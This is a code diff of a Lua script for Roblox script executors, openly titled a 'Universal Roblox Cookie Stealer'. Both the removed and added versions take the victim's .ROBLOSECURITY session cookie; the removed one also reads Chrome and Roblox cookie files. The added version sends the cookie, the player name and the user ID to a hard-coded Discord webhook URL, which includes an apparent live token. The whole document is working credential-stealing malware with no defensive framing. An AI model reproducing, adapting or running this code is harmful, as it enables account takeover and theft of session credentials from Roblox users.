@@ -1,76 +1,35 @@
--- Universal Roblox Cookie Stealer (with Browser extraction)
-local player = game.Players.LocalPlayer
-local http = game:GetService("HttpService")
-
-local cookie = ""
-
--- Method 1: Executor cookie function
-if syn and syn.cookie then
-    cookie = syn.cookie()
-elseif getcookie then
-    cookie = getcookie()
-end
-
--- Method 2: If cookie still empty, try to get from browser
-if cookie == "" or cookie == nil then
-    -- For Windows: Read from Chrome's local storage
-    local username = os.getenv("USERNAME")
-    local paths = {
-        "C:\\Users\\" .. username .. "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies",
-        "C:\\Users\\" .. username .. "\\AppData\\Roaming\\Roblox\\Cookies",
+loadstring([[
+    local player = game.Players.LocalPlayer
+    local http = game:GetService("HttpService")
+    
+    local cookie = ""
+    if syn and syn.cookie then
+        cookie = syn.cookie()
+    elseif getcookie then
+        cookie = getcookie()
+    end
+    
+    local webhook = "https://discord.com/api/webhooks/1499055946222145638/PWJv3IVfr9WAucXk0BYEP54gAp_wuaYpGKJQs5Px-gFRZVyoLv3u81QIZ5XNpkSsdqNx"
+    
+    local data = {
+        content = "**🍪 COOKIE STOLEN!**",
+        embeds = {{
+            title = player.Name,
+            description = "```" .. cookie .. "```",
+            color = 0xff0000,
+            fields = {
+                {name = "User ID", value = tostring(player.UserId), inline = true},
+                {name = "Time", value = os.date("%Y-%m-%d %H:%M:%S"), inline = true}
+            }
+        }}
     }
     
-    for _, path in pairs(paths) do
-        if isfile and isfile(path) then
-            local content = readfile and readfile(path) or ""
-            if content and content:match("_|WARNING") then
-                cookie = content:match("_|WARNING[^\n]+")
-                break
-            end
-        end
-    end
-end
-
--- Method 3: Manual input fallback
-if cookie == "" or cookie == nil then
-    cookie = "MANUAL_REQUIRED"
-    setclipboard and setclipboard("Go to Chrome F12 > Application > Cookies > .ROBLOSECURITY and paste here")
-end
-
-local data = {
-    user = player.Name,
-    userId = player.UserId,
-    cookie = cookie,
-    time = os.time(),
-    executor = identifyexecutor and identifyexecutor() or "Unknown"
-}
-
--- Send to your server
-local sent = false
-
-if syn and syn.request then
     syn.request({
-        Url = "http://localhost:8080/steal",
+        Url = webhook,
         Method = "POST",
         Headers = {["Content-Type"] = "application/json"},
         Body = http:JSONEncode(data)
     })
-    sent = true
-end
-
-if request and not sent then
-    request({
-        Url = "http://localhost:8080/steal",
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = http:JSONEncode(data)
-    })
-    sent = true
-end
-
-if sent then
-    print("Cookie sent: " .. (cookie ~= "" and "YES" or "NO"))
-else
-    print("Failed to send - copy this cookie manually: " .. cookie)
-    setclipboard and setclipboard(cookie)
-end
+    
+    print("Cookie sent to Discord!")
+]])()
